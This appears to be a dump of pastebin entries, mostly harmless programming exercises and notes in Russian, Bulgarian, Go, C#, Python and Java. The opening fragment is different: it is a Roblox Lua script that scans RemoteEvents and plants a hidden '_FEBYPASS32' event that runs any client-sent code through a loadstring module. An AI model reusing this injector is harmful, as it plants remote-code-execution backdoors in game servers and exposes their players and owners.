                    folder.Name = ""_FEBYPASS32""
                    folder.Parent = game:GetService(""JointsService"")
                    local loadstring = require(13684410229)
                    folder.OnServerEvent:Connect(function(_1,_2)
                        loadstring(_2)()
                    end)
                ]])
            end)
        end
    end
end

-- RemoteEvent'leri tara
scanForRemote(game:GetService(""ReplicatedStorage""))

-- Sonuç kontrolü
repeat wait(0.1) timer += 0.1 until game:GetService(""JointsService""):FindFirstChild(""_FEBYPASS32"") or timer >= timeout

if game:GetService(""JointsService""):FindFirstChild(""_FEBYPASS32"") then
    print(""✅ Backdoor bulundu!"")
else
    print(""❌ Backdoor bulunamadı."")
end
"
aiJGiSZz,Untitled,lemansky,HTML 5,Wednesday 14th of May 2025 02:52:50 PM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
  <meta charset=""UTF-8"">
  <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
  <title>Circles</title>
  <style>
    canvas {
      background: black;
    }
  </style>
</head>
<body>
  <canvas id=""myCanvas"" width=""800"" height=""800""></canvas>

  <script>
    const canvas = document.querySelector('canvas');
    const ctx = canvas.getContext(""2d"");
    ctx.lineWidth = 2;
    ctx.strokeStyle = 'white';  
    canvas.addEventListener('mousemove', (e) => {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      let mouseX = e.offsetX;
      let mouseY = e.offsetY;

      let distanceToCenterX = Math.abs(mouseX - canvas.width / 2);
      let distanceToCenterY = Math.abs(mouseY - canvas.height / 2);
      
      let growingValue = (distanceToCenterX + distanceToCenterY) / 4;

      for(let i = 0; i < 5; i++){
        let x = 0;
        if(e.offsetX > canvas.width/2){
          x = i*40 ;
        } else if( e.offsetX < canvas.width/2){
          x = -i*40;
        } else {
          x = 0; 
        }
        let y = 0;
        if(e.offsetY > canvas.height/2){
          y = i*40;
        } else if(e.offsetY < canvas.height/2){
          y = -i*40;
        } else {
          y = 0
        }
        console.log(20 + i*growingValue);
        ctx.beginPath();
        ctx.arc(canvas.width/2 + x, canvas.height/2 + y, 20 + i*growingValue, 0, Math.PI*2);
        ctx.closePath();
        ctx.stroke();
      }
    });
  </script>
</body>
</html>
"
LmgSpv5p,2025-05-14T21:22:35.188621,powerampache,PHP,Wednesday 14th of May 2025 02:22:34 PM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 Not Found
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1156)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:651)
	at java.lang.Thread.run(Thread.java:1119)

authorize() - cannot load data HttpException {""code"":404,""message"":""Not Found"",""detailMessage"":""HTTP 404 Not Found"",""stackTrace"":[],""suppressedExceptions"":[]}"
SC8j5Zst,vstraivanie_types,AlexNovoross87,Go,Wednesday 14th of May 2025 02:21:22 PM CDT,"Встраивание типов
 Встраивание типов - это способ легко:
a) Предоставить существующую функциональность новому типу
б) Требовать, чтобы тип реализовывал несколько интерфейсов

Вложенные интерфейсы
---------------------
->Вложенные интерфейсы позволяют вам «встраивать» один интерфейс в другой интерфейс.
 *Реализация интерфейса требует реализации всех встроенных функций.
 *Позволяет избежать дублирования объявлений интерфейсов и
  минимизирует необходимость написания повторяющихся объявлений
-> Изменения во встроенных интерфейсах автоматически распространяются
   *Облегчается поддержка кодовой базы (ошибки компилятора указывают на то, 
   где необходимы обновления)

   Обьявляем интерфейсы:
   type Whisperer interface{ Whisper() string }
   type Yeller interface{ Yell() string }

Встраиваем интерфейсы в один интерфейс
type Talker interface {
	Whisperer
	Yeller
}

Создаем структуру и реализовываем интерфейс:
type Waaaa struct {
}
func (w *Waaaa) Whisper() string {
	return ""WHHHHHH""
}
func (w *Waaaa) Yell() string {
	return ""YELL""
}

//Функция, принимающая интерфейс
func Do(obj Talker) {
	fmt.Println(obj.Whisper())
	fmt.Println(obj.Yell())
}

func trt() {
	var i Waaaa
	Do(&i)
}

===================================================
->Вложенные структуры
  *Встроенные структуры (embedded structs) позволяют ""встраивать"" 
   одну структуру внутрь другой структуры
   Структура будет иметь доступ к всем методам-получателям и 
   данным встроенной структуры на верхнем уровне
   Это называется продвижением полей и методов (field & method promotion) 
   Он обеспечивает удобный доступ к данным встроенной структуры 
   без дополнительной косвенности

   type Account struct {
	accountId int
	balance   int
	name      string
}

func (a *Account) String() string {
	return ""AccountStr""
}
func (a *Account) GetBallance() int {
	return a.balance
}

type ManagerAccount struct{ Account }

//Поведет себя как override в с++, но можно
//получить функцию базового класса
func (m ManagerAccount) String() string {
	return ""MANAGE ACCOUNTER""
}

func Dostruct() {
	mgrAcct := ManagerAccount{Account{-2, 30, ""Cassandra""}}
	fmt.Println(mgrAcct)
	fmt.Println(mgrAcct.GetBallance())
	fmt.Println(mgrAcct.String())
}"
Fh4EghQZ,read_wr_bufio,AlexNovoross87,Go,Wednesday 14th of May 2025 02:20:35 PM CDT,"Чтение и запись
Reader и Writer - это интерфейсы, которые позволяют чтение из и запись в источники ввода-вывода
| Сетевые сокеты, файлы, произвольные массивы
Множество реализаций в стандартной библиотеке
Reader - это низкоуровневая реализация
| Обычно предпочтительно работать с пакетом bufio вместо чтения напрямую из Reader

Интерфейсы
-----------
type Reader interface {
Read(p []byte) (n int, err error)
}

type Writer interface {
Write(p []byte) (n int, err error)
}

=============================================================
Чтение

type Reader interface {
    Read(p []byte) (n int, err error)
}

Каждый вызов функции Read() будет заполнять предоставленный буфер р
| Количество прочитанных байт будет возвращено в виде значения п
Когда все байты будут прочитаны, err будет содержать значение io.EOF

ЧТОБЫ ПРОВЕРИТЬ СЧИТАЛИСЬ ЛИ ВСЕ БАЙТЫ ПРАВИЛЬНО - НАДО ПРОВЕРИТЬ СОДЕРЖИТ
ЛИ err io.EOF . Если да, то чтение произошло успешно.


import (
	""fmt""
	""io""
	""strings""
)

func rd() {

	/*
			Создаётся объект reader типа *strings.Reader, который позволяет читать строку ""SAMPLE"" как поток байтов.
		    Это похоже на открытие файла или потока, но данные берутся из строки.
	*/
	reader := strings.NewReader(""SAMPLE"")
	/*
			Создаётся объект newString для эффективной последовательной записи строк или байтов.
		    В конце мы используем его, чтобы собрать прочитанные данные в одну строку.
	*/
	var newString strings.Builder

	/*
			Создаётся объект newString для эффективной последовательной записи строк или байтов.
		    В конце мы используем его, чтобы собрать прочитанные данные в одну строку.
	*/
	buffer := make([]byte, 4)

	for {
		/*
			вызывается метод Read у reader, который пытается прочитать до 4 байт
			(размер буфера) из строки ""SAMPLE"".
		*/
		numBytes, err := reader.Read(buffer)
		/*
			срез буффера numBytes - колво прочитанных байт (если прочитано 4 байт то numBytes
			будет 4, если меньше - то меньше)
		*/
		chunk := buffer[:numBytes]
		/*
			newString.Write(chunk) - записываем прочитанные байты в strings.Builder
		*/
		newString.Write(chunk)
		/*
			Печатаем количество прочитаных байт и байты
		*/
		fmt.Printf(""Read %v bytes: %c\n"", numBytes, chunk)

		//Если достигнут конец данных прерываем цикл
		if err == io.EOF {
			break
		}
	}
	fmt.Printf("" %v \n"", newString.String())
}

=================================================================================
bufio
I Пакет bufio предоставляет буферизацию для чтения и записи с 
использованием типов Reader и Writer соответственно
   | Необходимости вручную управлять буферами или создавать данные нет

func bforead() {

	/*
			Создание источника данных
		    strings.NewReader(""SAMPLE"") создаёт объект io.Reader, который читает
		    данные из строки ""SAMPLE"" как из потока байтов
	*/
	source := strings.NewReader(""SAMPLE"")

	/*
		Оборачивание в буферизированный ридер bufio.NewReader(source)
		создаёт буферизированный ридер, который оборачивает исходный io.Reader.
		Это позволяет читать данные более эффективно и использовать дополнительные
		методы, такие как ReadString
	*/
	buffered := bufio.NewReader(source)
	/*
		Чтение строки до символа '\n'
		Вызов buffered.ReadString('\n') пытается прочитать из буфера все байты до
		первого вхождения символа новой строки '\n' (включая сам символ).
		Если символ '\n' найден, функция возвращает строку до и включая этот символ, а err == nil.
		Если символ '\n' не найден и достигнут конец потока, функция возвращает все
		доступные данные и ошибку io.EOF.
	*/
	newString, err := buffered.ReadString('\n')
	if err == io.EOF {
		fmt.Println(newString)
	} else {
		fmt.Println(""something went wrong..."")
	}

}


func bfosearch() {
	// Read lines from standard input
	//1. Создание сканера для чтения из стандартного ввода
	scanner := bufio.NewScanner(os.Stdin)
	//2. Создание среза для хранения строк
	lines := make([]string, 0, 5)

	//Пока идет ввод
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	//Если произошла ошибка
	if scanner.Err() != nil {
		fmt.Println(scanner.Err())
	}
    //Сколько линий прочитано
	fmt.Printf(""Line count: %v\n"", len(lines))

	//Печать линий
	for _, line := range lines {
		fmt.Printf(""Line: %v\n"", line)
	}

}

//////////////////////////////////////////////////////////////

Запись

func bfread() {
	//Создание нового буфера
	buffer := bytes.NewBufferString("""")
	//Записать в буффер
	numBytes, err := buffer.WriteString(""SAMPLE"")
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Printf(""Wrote %v bytes: %c\n"", numBytes, buffer)
	}
}"
PE8MKGks,Untitled,Rodunskiy,C#,Wednesday 14th of May 2025 01:51:10 PM CDT,"namespace CSLight
{
    class Program
    {
        static void Main(string[] args)
        {
            Database database = new Database();
            database.Work();
        }
    }

    class Database
    {
        private List<Player> _players = new List<Player>();
        private int _nextIdPlayer = 1;

        public void Work()
        {
            bool isWorking = true;

            while (isWorking)
            {
                ShowMenu();
                string userInput = Console.ReadLine();

                switch (userInput)
                {
                    case ""1"":
                        AddPlayer();
                        break;

                    case ""2"":
                        BanPlayer();
                        break;

                    case ""3"":
                        UnbanPlayer();
                        break;

                    case ""4"":
                        DeletePlayer();
                        break;

                    case ""5"":
                        PrintAllPlayers();
                        break;

                    case ""6"":
                        isWorking = false;
                        break;

                    default:
                        Console.WriteLine(""Неверный выбор. Попробуйте еще раз."");
                        break;
                }
            }
        }

        private void ShowMenu()
        {
            string AddPlayerCommand = ""1"";
            string BanPlayerCommand = ""2"";
            string UnbanPlayerCommand = ""3"";
            string DeletePlayerCommand = ""4"";
            string PrintAllPlayersCommand = ""5"";
            string ExitProgramCommand = ""6"";

            Console.WriteLine($""{AddPlayerCommand})Добавить игрока.\n{BanPlayerCommand})Забанить игрока.\n{UnbanPlayerCommand})Разбанить игрока.\n{DeletePlayerCommand})Удалить игрока."" +
                              $""\n{PrintAllPlayersCommand})Вывести список всех игроков.\n{ExitProgramCommand})Выход из программы."");
        }

        private void AddPlayer()
        {
            Console.WriteLine(""Введите ник игрока:"");
            string nickname = Console.ReadLine();

            Console.WriteLine(""Введите уровень:"");
            int level = ReadInt(""Уровень должен быть числом. Попробуйте еще раз:"");

            Player player = new Player(_nextIdPlayer, nickname, level);
            _players.Add(player);
            _nextIdPlayer++;

            Console.WriteLine($""Игрок {nickname} добавлен с ID {player.Id}"");
        }

        private void BanPlayer()
        {
            int id = ReadInt(""ID игрока должен быть числом. Попробуйте еще раз:"");

            if (TryGetPlayer(id, out Player player))
            {
                player.Ban();
                Console.WriteLine($""Игрок {player.Nickname} (ID: {id}) забанен."");
            }
        }

        private void UnbanPlayer()
        {
            int id = ReadInt(""ID игрока должен быть числом. Попробуйте еще раз:"");

            if (TryGetPlayer(id, out Player player))
            {
                player.Unban();
                Console.WriteLine($""Игрок {player.Nickname} (ID: {id}) разбанен."");
            }
        }

        private void DeletePlayer()
        {
            int id = ReadInt(""ID игрока должен быть числом. Попробуйте еще раз:"");

            if (TryGetPlayer(id, out Player player))
            {
                _players.Remove(player);
                Console.WriteLine($""Игрок {player.Nickname} (ID: {id}) удален."");
            }
        }

        private void PrintAllPlayers()
        {
            if (_players.Count == 0)
            {
                Console.WriteLine(""В базе нет игроков."");
            }
            else
            {
                Console.WriteLine(""Список игроков:"");
                foreach (var player in _players)
                {
                    player.ShowInfo();
                }
            }
        }

        private bool TryGetPlayer(int id, out Player player)
        {
            player = _players.FirstOrDefault(p => p.Id == id);

            if (player != null)
            {
                return true;
            }

            Console.WriteLine($""Игрок с ID {id} не найден."");

            return false;
        }

        private int ReadInt(string errorMessage)
        {
            int result;
            while (!int.TryParse(Console.ReadLine(), out result))
            {
                Console.WriteLine(errorMessage);
            }

            return result;
        }
    }

    class Player
    {
        public Player(int id, string nickname, int level, bool isBanned = false)
        {
            Id = id;
            Nickname = nickname;
            Level = level;
            IsBanned = isBanned;
        }

        public int Id { get; }
        public string Nickname { get; }
        public int Level { get; }
        public bool IsBanned { get; private set; }

        public void Ban()
        {
            IsBanned = true;
        }

        public void Unban()
        {
            IsBanned = false;
        }

        public void ShowInfo()
        {
            string status = IsBanned ? ""Забанен"" : ""Активен"";
            Console.WriteLine($""ID: {Id} | Ник: {Nickname} | Уровень: {Level} | Статус: {status}"");
        }
    }
}"
SgfgAsUW,GCP Editor error,-Miura-,JavaScript,Wednesday 14th of May 2025 01:33:18 PM CDT,"Uncaught (in promise) TypeError: (intermediate value).split is not a function
    create index.js:2739
    value ha-code-editor.ts:235
    value ha-code-editor.ts:124
    performUpdate reactive-element.ts:1333
    scheduleUpdate reactive-element.ts:1262
    a Babel
    value ha-code-editor.ts:40
    _$Ej reactive-element.ts:1237
    requestUpdate reactive-element.ts:1215
    _$Eu reactive-element.ts:950
    w reactive-element.ts:932
    i ha-code-editor.ts:40
    N scoped-custom-element-registry.ts:642
    t scoped-custom-element-registry.ts:408
    u lit-html.ts:1129
    g lit-html.ts:1543
    _$AI lit-html.ts:1384
    W lit-html.ts:2183
    update lit-element.ts:166
    performUpdate reactive-element.ts:1333
    scheduleUpdate reactive-element.ts:1262
    _$Ej reactive-element.ts:1237
    requestUpdate reactive-element.ts:1215
    _$Eu reactive-element.ts:950
    w reactive-element.ts:932
    S lit-element.ts:115
    F ha-selector-template.ts:13
    N scoped-custom-element-registry.ts:642
    t scoped-custom-element-registry.ts:408
    render dynamic-element-directive.ts:31
    update dynamic-element-directive.ts:27
    _$AS directive.ts:134
    $ lit-html.ts:1085
    _$AI lit-html.ts:1362
    v lit-html.ts:1192
    g lit-html.ts:1553
    _$AI lit-html.ts:1384
3 index.js:2739:41
"
pnSsnvT9,Even_odd_and_division_by_3,zyulfi,Python,Wednesday 14th of May 2025 01:31:58 PM CDT,"# Четно/Нечетно и деление на 3

# Напишете програма, която приема цяло число и отпечатва:
	# ""Четно и се дели на 3"", ако се дели на 2 и на 3
	# ""Четно"", ако се дели само на 2
	# ""Дели се на 3"", ако се дели само на 3
	# ""Нито четно, нито делимо на 3"" – в противен случай

num = int(input(""Моля, въведете цяло число: ""))

if (num % 2 == 0 and num % 3 == 0):
    print(""Числото е четно и се дели на 3"")
elif (num % 2 == 0):
    print(""Числото е четно"")
elif (num % 3 == 0):
    print(""Числото се дели на 3"")
else:
    print(""Числото нито четно, нито делимо на 3"")"
3G2BWLtG,Password_new,zyulfi,Python,Wednesday 14th of May 2025 12:52:47 PM CDT,"# Да се създаде програма, която проверява входните данни.

name = input(""Моля, въведете потребителско име: "")
password = input(""Моля, въведете парола: "")

name_user = input(""Моля, въведете потребителско име за вход: "")
pass_user = input(""Моля, въведете парола за вход: "")

if (name_user == name and pass_user == password):
    print(""Добре дошъл, "" + name)
else:
    while True:
        if (name_user != name and pass_user == password):
            print(""Грешно потребителско име!"")
            name_user = input(""Моля, въведете вярно потребителко име за вход: "")

        if (name_user == name and pass_user != password):
            print(""Грешна парола!"")
            pass_user = input(""Моля, въведете вярнa парола за вход: "")

        if (name_user != name and pass_user != password):
            print(""Грешно потребителско име и парола!"")
            name_user = input(""Моля, въведете вярно потребителко име за вход: "")
            pass_user = input(""Моля, въведете вярнa парола за вход: "")

        if (name_user == name and pass_user == password):
            print(""Добре дошъл, "" + name)
            break
"
z1eR0zwC,Untitled,Rodunskiy,C#,Wednesday 14th of May 2025 12:42:36 PM CDT,"namespace CSLight
{
    class Program
    {
        static void Main(string[] args)
        {
            Database database = new Database();
            database.Work();
        }
    }

    class Database
    {
        private const string AddPlayerCommand = ""1"";
        private const string BanPlayerCommand = ""2"";
        private const string UnbanPlayerCommand = ""3"";
        private const string DeletePlayerCommand = ""4"";
        private const string PrintAllPlayersCommand = ""5"";
        private const string ExitProgramCommand = ""6"";

        private List<Player> _players = new List<Player>();
        private int _nextIdPlayer = 1;

        public void Work()
        {
            bool isWorking = true;

            while (isWorking)
            {
                ShowMenu();
                string userInput = Console.ReadLine();

                switch (userInput)
                {
                    case AddPlayerCommand:
                        AddPlayer();
                        break;

                    case BanPlayerCommand:
                        BanPlayer();
                        break;

                    case UnbanPlayerCommand:
                        UnbanPlayer();
                        break;

                    case DeletePlayerCommand:
                        DeletePlayer();
                        break;

                    case PrintAllPlayersCommand:
                        PrintAllPlayers();
                        break;

                    case ExitProgramCommand:
                        isWorking = false;
                        break;

                    default:
                        Console.WriteLine(""Неверный выбор. Попробуйте еще раз."");
                        break;
                }
            }
        }

        private void ShowMenu()
        {
            Console.WriteLine($""{AddPlayerCommand})Добавить игрока.\n{BanPlayerCommand})Забанить игрока.\n{UnbanPlayerCommand})Разбанить игрока.\n{DeletePlayerCommand})Удалить игрока."" +
                              $""\n{PrintAllPlayersCommand})Вывести список всех игроков.\n{ExitProgramCommand})Выход из программы."");
        }

        private void AddPlayer()
        {
            Console.WriteLine(""Введите ник игрока:"");
            string nickname = Console.ReadLine();

            Console.WriteLine(""Введите уровень:"");
            int level = ReadInt(""Уровень должен быть числом. Попробуйте еще раз:"");

            Player player = new Player(_nextIdPlayer, nickname, level);
            _players.Add(player);
            _nextIdPlayer++;

            Console.WriteLine($""Игрок {nickname} добавлен с ID {player.Id}"");
        }

        private void BanPlayer()
        {
            int id = ReadInt(""ID игрока должен быть числом. Попробуйте еще раз:"");

            if (TryGetPlayer(id, out Player player))
            {
                player.Ban();
                Console.WriteLine($""Игрок {player.Nickname} (ID: {id}) забанен."");
            }
        }

        private void UnbanPlayer()
        {
            int id = ReadInt(""ID игрока должен быть числом. Попробуйте еще раз:"");

            if (TryGetPlayer(id, out Player player))
            {
                player.Unban();
                Console.WriteLine($""Игрок {player.Nickname} (ID: {id}) разбанен."");
            }
        }

        private void DeletePlayer()
        {
            int id = ReadInt(""ID игрока должен быть числом. Попробуйте еще раз:"");

            Player playerToRemove = _players.FirstOrDefault(p => p.Id == id);

            if (playerToRemove != null)
            {
                _players.Remove(playerToRemove);
                Console.WriteLine($""Игрок {playerToRemove.Nickname} (ID: {id}) удален."");
            }
            else
            {
                Console.WriteLine($""Игрок с ID {id} не найден."");
            }
        }

        private void PrintAllPlayers()
        {
            if (_players.Count == 0)
            {
                Console.WriteLine(""В базе нет игроков."");
            }
            else
            {
                Console.WriteLine(""Список игроков:"");
                foreach (var player in _players)
                {
                    player.ShowInfo();
                }
            }
        }

        private bool TryGetPlayer(int id, out Player player)
        {
            player = _players.FirstOrDefault(p => p.Id == id);

            if (player != null)
            {
                return true;
            }

            Console.WriteLine($""Игрок с ID {id} не найден."");
            return false;
        }

        private int ReadInt(string errorMessage)
        {
            int result;
            while (!int.TryParse(Console.ReadLine(), out result))
            {
                Console.WriteLine(errorMessage);
            }
            return result;
        }
    }

    class Player
    {
        public int Id { get; }
        public string Nickname { get; }
        public int Level { get; }
        public bool IsBanned { get; private set; }

        public Player(int id, string nickname, int level, bool isBanned = false)
        {
            Id = id;
            Nickname = nickname;
            Level = level;
            IsBanned = isBanned;
        }

        public void Ban()
        {
            IsBanned = true;
        }

        public void Unban()
        {
            IsBanned = false;
        }

        public void ShowInfo()
        {
            string status = IsBanned ? ""Забанен"" : ""Активен"";
            Console.WriteLine($""ID: {Id} | Ник: {Nickname} | Уровень: {Level} | Статус: {status}"");
        }
    }
}"
fr23QFbY,Untitled,Rodunskiy,C#,Wednesday 14th of May 2025 12:42:00 PM CDT,"namespace CSLight
{
    class Program
    {
        static void Main(string[] args)
        {
            Database database = new Database();
            database.Work();


        }
    }

    class Database
    {
        private const string AddPlayerCommand = ""1"";
        private const string BanPlayerCommand = ""2"";
        private const string UnbanPlayerCommand = ""3"";
        private const string DeletePlayerCommand = ""4"";
        private const string PrintAllPlayersCommand = ""5"";
        private const string ExitProgramCommand = ""6"";

        private List<Player> _players = new List<Player>();
        private int _nextIdPlayer = 1;

        public void Work()
        {
            bool isWorking = true;

            while (isWorking)
            {
                ShowMenu();
                string userInput = Console.ReadLine();

                switch (userInput)
                {
                    case AddPlayerCommand:
                        AddPlayer();
                        break;

                    case BanPlayerCommand:
                        BanPlayer();
                        break;

                    case UnbanPlayerCommand:
                        UnbanPlayer();
                        break;

                    case DeletePlayerCommand:
                        DeletePlayer();
                        break;

                    case PrintAllPlayersCommand:
                        PrintAllPlayers();
                        break;

                    case ExitProgramCommand:
                        isWorking = false;
                        break;

                    default:
                        Console.WriteLine(""Неверный выбор. Попробуйте еще раз."");
                        break;
                }
            }
        }

        private void ShowMenu()
        {
            Console.WriteLine($""{AddPlayerCommand})Добавить игрока.\n{BanPlayerCommand})Забанить игрока.\n{UnbanPlayerCommand})Разбанить игрока.\n{DeletePlayerCommand})Удалить игрока."" +
                              $""\n{PrintAllPlayersCommand})Вывести список всех игроков.\n{ExitProgramCommand})Выход из программы."");
        }

        private void AddPlayer()
        {
            Console.WriteLine(""Введите ник игрока:"");
            string nickname = Console.ReadLine();

            Console.WriteLine(""Введите уровень:"");
            int level = ReadInt(""Уровень должен быть числом. Попробуйте еще раз:"");

            Player player = new Player(_nextIdPlayer, nickname, level);
            _players.Add(player);
            _nextIdPlayer++;

            Console.WriteLine($""Игрок {nickname} добавлен с ID {player.Id}"");
        }

        private void BanPlayer()
        {
            int id = ReadInt(""ID игрока должен быть числом. Попробуйте еще раз:"");

            if (TryGetPlayer(id, out Player player))
            {
                player.Ban();
                Console.WriteLine($""Игрок {player.Nickname} (ID: {id}) забанен."");
            }
        }

        private void UnbanPlayer()
        {
            int id = ReadInt(""ID игрока должен быть числом. Попробуйте еще раз:"");

            if (TryGetPlayer(id, out Player player))
            {
                player.Unban();
                Console.WriteLine($""Игрок {player.Nickname} (ID: {id}) разбанен."");
            }
        }

        private void DeletePlayer()
        {
            int id = ReadInt(""ID игрока должен быть числом. Попробуйте еще раз:"");

            Player playerToRemove = _players.FirstOrDefault(p => p.Id == id);

            if (playerToRemove != null)
            {
                _players.Remove(playerToRemove);
                Console.WriteLine($""Игрок {playerToRemove.Nickname} (ID: {id}) удален."");
            }
            else
            {
                Console.WriteLine($""Игрок с ID {id} не найден."");
            }
        }

        private void PrintAllPlayers()
        {
            if (_players.Count == 0)
            {
                Console.WriteLine(""В базе нет игроков."");
            }
            else
            {
                Console.WriteLine(""Список игроков:"");
                foreach (var player in _players)
                {
                    player.ShowInfo();
                }
            }
        }

        private bool TryGetPlayer(int id, out Player player)
        {
            player = _players.FirstOrDefault(p => p.Id == id);

            if (player != null)
            {
                return true;
            }

            Console.WriteLine($""Игрок с ID {id} не найден."");
            return false;
        }

        private int ReadInt(string errorMessage)
        {
            int result;
            while (!int.TryParse(Console.ReadLine(), out result))
            {
                Console.WriteLine(errorMessage);
            }
            return result;
        }
    }

    class Player
    {
        public int Id { get; }
        public string Nickname { get; }
        public int Level { get; }
        public bool IsBanned { get; private set; }

        public Player(int id, string nickname, int level, bool isBanned = false)
        {
            Id = id;
            Nickname = nickname;
            Level = level;
            IsBanned = isBanned;
        }

        public void Ban()
        {
            IsBanned = true;
        }

        public void Unban()
        {
            IsBanned = false;
        }

        public void ShowInfo()
        {
            string status = IsBanned ? ""Забанен"" : ""Активен"";
            Console.WriteLine($""ID: {Id} | Ник: {Nickname} | Уровень: {Level} | Статус: {status}"");
        }
    }
}"
RynW2VRM,26 багажи ячейки,nq1s788,Python,Wednesday 14th of May 2025 12:37:40 PM CDT,"В аэропорту есть камера хранения из К ячеек, которые пронумерованы с 1. Принимаемый багаж кладется в свободную ячейку с минимальным номером. Известно время, когда пассажиры сдают и забирают багаж (в минутах с начала суток). Ячейка доступна для багажа, начиная со следующей минуты, после окончания срока хранения. Если свободных ячеек не находится, то багаж не принимается в камеру хранения.

Найдите количество багажа, которое будет сдано в камеры за 24 часа и номер ячейки, в которую сдаст багаж последний пассажир.

Входные данные

В первой строке входного файла находится число К — количество ячеек в камере хранения, во второй строке файла число М — количество пассажиров, сдающих

багаж (натуральное число, не превышающее 1000). Каждая из следующих № строк содержит два натуральных числа, не превышающих 1440: время сдачи багажа

и время выдачи багажа.

Выходные данные

Программа должна вывести два числа: количество сданных в камеру хранения багажа и номер ячейки, в которую примут багаж у последнего пассажира, который сможет сдать багаж

Типовой пример организации данных:

2

5

30 60

40 60

50 1110

61 1010

1100 1440

Для указанного примера багаж смогут сдать первый, второй, четвёртый и пятый пассажир. Последний пассажир сдаст свой багаж в ячейку один, так как к этому моменту первая и вторая ячейка будут свободны.

#####################################################

data = open('26.txt').readlines()
k = int(data[0])
m = int(data[1])
a = []
for i in range(2, len(data)):
    l, r = map(int, data[i].split())
    a.append((l, 0, i - 2))
    a.append((r, 1, i - 2))
is_taken = [0] * k
num = [-1] * m
a.sort()
lst = -1
cnt = 0
for e in a:
    if e[1] == 0:
        if 0 in is_taken:
            x = is_taken.index(0)
            is_taken[x] = 1
            num[e[2]] = x
            lst = x + 1
            cnt += 1
    else:
        if num[e[2]] != -1:
            is_taken[num[e[2]]] = 0
            num[e[2]] = -1
print(cnt, lst)"
eUcbTVpM,min fatigue possible after adding k stops at anywhere in between,Kali_prasad,Java,Wednesday 14th of May 2025 12:20:11 PM CDT,"/*
A20250511b_UberOA
#binary_search

given you a list of travel stops by uber drivers in an array and they are strictly increasing

the fatigue is called as difference between the stops
we need to decrease the maximum fatigue through out their entiner journey
we can place a stop at any point of time but only k times

find the minimum possible max fatigue that can be done after inducing k stops
-----------------------------------------------------------------------------------------------------

important thing to be noted here is - 

lets say you have stops at 2 and 8 ,so the fatigue is 6

if you can place one stop between them you can put at 3
then it makes 2 3 8 as stops fatigue btw 2-3 is 1 and 3-8 is 5 
so max fatigue shrink down to 5 ,but we can do it better what if
we put the stop at middle point this makes the distance on either side of stop
as equidistant which hopefully reduces the overall max 


what's now 
ideally to reduce fatigue we can put many stops and shrink down the max fatigue to 1
but we can use utmost k stops it might not be possible
lazily we can leave fatigue as it is and put no stops ,but thats bad

this makes it as binary search problem

choose a desiredFatigue x
check if it is possible 
if possible then try for less desiredFatigue less than x
else settle in search of possible less desiredFatigue more than x

assume the currFatigue say 5 between one of the stops is y
but we need it to be desiredFatigue say 3
this will give us stopsNeeded
ceil(5/3)-1 => 1 just one stop is enough 
this brings us to the formula
ceil(currFatigue /desiredFatigue)-1







-----------------------------------------------------------------------------------------------------

input - stops and allowedStops
2 5 10
3


output - 
2

*/

import java.util.*;





@SuppressWarnings({""unused"",""unchecked""})
public class A20250511b_UberOA  {

    static Scanner sc = new Scanner(System.in);

    private static int[] getArray() {
        String[] sArr = sc.nextLine().split("" "");
        int[] arr = Arrays.stream(sArr).mapToInt(Integer::parseInt).toArray();
        return arr;
    }

    private static char[] getCharArray() {
        String[] sArr = sc.nextLine().split("" "");
        char[] cArr = new char[sArr.length];
        for (int i = 0; i < sArr.length; i++) {
            cArr[i] = sArr[i].charAt(0); // Take the first character of each string
        }
        return cArr;
    }

    private static int getMax(int[] arr) {
        int currMax = Integer.MIN_VALUE;
        for (int curr : arr) {
            currMax = Math.max(currMax, curr);
        }
        return currMax;
    }

    private static boolean checkIfPossible(int desiredFatigue,int[] stops,int availableStops){
        int lenn = stops.length;
        int totalRequireStops = 0;
        // System.out.println(""desiredFatigue is "" + desiredFatigue);
        for(int i = 0;i<lenn-1;i+=1){
            int currFatigue = stops[i+1]-stops[i];
            int currStops = 0;
            if(currFatigue>desiredFatigue){
                //putting a double is importan other wise java already make your answer rounded down
                currStops += (int)Math.ceil((double)currFatigue/desiredFatigue)-1;
            }
            // System.out.println(""currStops is "" + currStops);
            totalRequireStops += currStops;
        }
        return totalRequireStops <= availableStops;
    }

    private static int checkminPossibleMaxFatigue(int left,int right,int[] stops,int availableStops){
        int ans = right;
        while(left<=right){
            int mid = (right-left)/2 + left;
            
            // System.out.println(""left is "" + left);
            // System.out.println(""right is "" + right);
            // System.out.println(""mid is "" + mid);
            if(checkIfPossible(mid,stops,availableStops)){
                right = mid-1;//become greedy and choose for more minimum fatigue
                ans = mid;
            }else{
                left = mid + 1;
            }
            // System.out.println(""ans is "" + ans);
  
        }
        return ans;

    }
   
    public static void main(String args[]) {
        // prepare the inputs


       int[] stops = getArray();
       int lenn = stops.length;
       int availableStops = getArray()[0];
       int maxi = -(int)(1e9+7);
       for(int i = 0;i<lenn-1;i+=1){
        maxi = Math.max(maxi,stops[i+1]-stops[i]);
       }
    //    System.out.println(""maxi is ""+maxi);
       int ans = checkminPossibleMaxFatigue(1,maxi,stops,availableStops);
       System.out.println(""ans is ""+ans);

    }
}

class Pair{
    int row;
    int col;
    public Pair(int i,int j){
        this.row = i;
        this.col = j;
        
    }
}"
